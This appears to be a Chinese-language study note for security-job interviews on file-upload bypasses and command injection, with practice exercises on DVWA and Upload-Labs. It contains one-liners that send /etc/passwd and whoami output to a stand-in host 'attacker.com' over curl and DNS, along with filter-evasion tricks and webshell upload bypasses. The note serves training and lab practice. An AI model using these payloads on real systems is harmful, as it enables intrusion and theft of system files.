# Day 8：文件上传与命令注入
> [上传/命令注入面试核心] 文件上传五层绕过/条件竞争/magic bytes/盲命令注入(时间+OOB)
## 核心知识点
### Q: 文件上传的六层防御和对应绕过方法
L1-前端JS校验：禁用JS/Burp截获改包→绕过。L2-扩展名黑名单：.php5/.phtml/.pht/.shtml/.phar→绕过。L3-Content-Type：改为image/jpeg→绕过。L4-Magic Bytes：在webshell前加GIF89a→绕过。L5-图片二次渲染：找不变字节段插入webshell→gifshuffer。L6-目录无执行权限：路径穿越→../upload/shell.php→写入可执行目录

面试亮点：能讲到二次渲染绕过说明你真遇到过高级文件上传防护
### Q: 命令注入的盲检测方法(Out-of-Band)
盲命令注入(无回显)检测三法：
1. 时间注入：;sleep 5→响应延时5s→确认存在
2. OOB DNS：;nslookup $(whoami).attacker.com→你的DNS服务器收到root.attacker.com的查询→确认注入并可提取信息
3. OOB HTTP：;curl http://attacker.com/$(cat /etc/passwd|base64)→服务器日志收到base64编码的passwd

面试加分：盲注入才是真实的——大部分命令注入不回显，OOB是唯一实用检测方式
### Q: 命令注入绕过过滤的九种技巧
空格替代：${IFS}、{cat,/etc/passwd}、<、<>、$IFS$9、%09(Tab)、%0a(换行符)
命令分隔符：; | || && %0a %0d
黑名单绕过：cat→c'a't、c\at、/bin/c?t、$(echo cat)
路径绕过：/etc/passwd→/etc/./passwd、/etc//passwd、/etc/xxx/../passwd
### Q: 文件上传的条件竞争(Condition Race)原理和利用
原理：上传→临时存储→检查(几百ms)→合法则保存/不合法则删除。在存储和检查之间的窗口→并发大量请求访问临时文件→检查期间webshell被执行。
工具：Burp Turbo Intruder(单包多连接)/Python threading racer脚本→如果检查200ms+攻击者1000次并发→总有一次被执行
## 面试陷阱
- 文件上传不只改扩展名——Magic Bytes和二次渲染才是区分入门和高级的标志
- 盲命令注入是实战主流——面试时提到OOB检测说明你做过真实渗透
- 命令注入在Windows和Linux上行为不同——面试时区分两个平台的命令分隔符

## 今日检测
1. DVWA/Upload-Labs完成全部21关
2. 用Commix自动化命令注入测试
3. 搭建Burp Collaborator或Interact.sh做OOB探测
